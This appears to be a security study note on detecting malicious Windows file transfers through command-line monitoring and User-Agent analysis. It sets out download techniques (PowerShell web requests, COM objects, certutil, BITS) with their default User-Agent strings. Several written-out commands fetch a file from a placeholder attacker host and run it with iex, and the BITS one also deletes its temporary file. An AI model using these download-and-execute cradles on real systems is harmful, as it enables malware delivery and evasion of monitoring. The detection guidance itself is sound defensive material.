# Detection of Malicious File Transfers

### Detection Methodology

Defenders use two primary methods to identify malicious file transfers: **command-line detection** and **User-Agent analysis**.

1. **Command-Line Detection**: Blacklisting specific commands is often bypassed through simple **case obfuscation**. A more robust, though time-consuming, method is **whitelisting** all known-good command lines within an environment to alert on any unusual activity.
2. **User-Agent Analysis**: HTTP clients, including system binaries and scripts, identify themselves via **User-Agent strings**. Organizations feed lists of legitimate user agents (OS processes, update services, antivirus) into a **SIEM** to filter traffic and isolate anomalies that indicate tool-based transfers (e.g., `sqlmap`, `nmap`, `cURL`).

---

### File Transfer Techniques and Signatures

#### 1. PowerShell Web Requests

**Scenario**: Standard method for downloading files or scripts directly into memory or to disk using built-in .NET wrappers.

**Operational Workflow**:

1. Execute the request to a remote server.
2. (Optional) Use `-OutFile` to save the payload to a specific path.

|Method|Command|Default User-Agent String|
|:--|:--|:--|
|**Invoke-WebRequest**|`Invoke-WebRequest http://<ATTACK_IP>/<FILE> -OutFile "C:\Users\Public\<FILE>"`|`Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`|
|**Invoke-RestMethod**|`Invoke-RestMethod http://<ATTACK_IP>/<FILE> -OutFile "C:\Users\Public\<FILE>"`|`Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`|

_Source:_

#### 2. COM Objects (WinHttpRequest / Msxml2)

**Scenario**: Used to bypass basic detection that monitors for standard PowerShell cmdlets by utilizing **Component Object Model (COM)** interfaces.

**Operational Workflow**:

1. Instantiate the COM object.
2. Open a connection to the `<ATTACK_IP>`.
3. Send the request and execute the response text via `iex`.

|Tool|Command|Default User-Agent String|
|:--|:--|:--|
|**WinHttpRequest**|`$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://<ATTACK_IP>/<FILE>',$false); $h.send(); iex $h.ResponseText`|`Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)`|
|**Msxml2.XMLHTTP**|`$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://<ATTACK_IP>/<FILE>',$false); $h.send(); iex $h.responseText`|`Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)`|

_Source:_

#### 3. Certutil

**Scenario**: A native Windows binary used for certificate management, frequently abused to download files via the `-urlcache` or `-verifyctl` flags.

**Operational Workflow**:

1. Use the `-urlcache` flag to pull a file from a remote URL.
2. Force the download with `-f` and split the output if necessary.

|Command|Default User-Agent String|
|:--|:--|
|`certutil -urlcache -split -f http://<ATTACK_IP>/<FILE>`|`Microsoft-CryptoAPI/10.0`|
|`certutil -verifyctl -split -f http://<ATTACK_IP>/<FILE>`|`Microsoft-CryptoAPI/10.0`|

_Source:_

#### 4. BITS (Background Intelligent Transfer Service)

**Scenario**: Used for asynchronous file transfers. It is often trusted by security products because it is a standard Windows mechanism for updates.

**Operational Workflow**:

1. Import the `bitstransfer` module.
2. Initiate the transfer to a temporary location.
3. Read the content into a variable, delete the temporary file, and execute the content.

|Command|Default User-Agent String|
|:--|:--|
|`Import-Module bitstransfer; Start-BitsTransfer 'http://<ATTACK_IP>/<FILE>' $env:temp\t; $r=gc $env:temp\t; rm $env:temp\t; iex $r`|`Microsoft BITS/7.8`|

_Source:_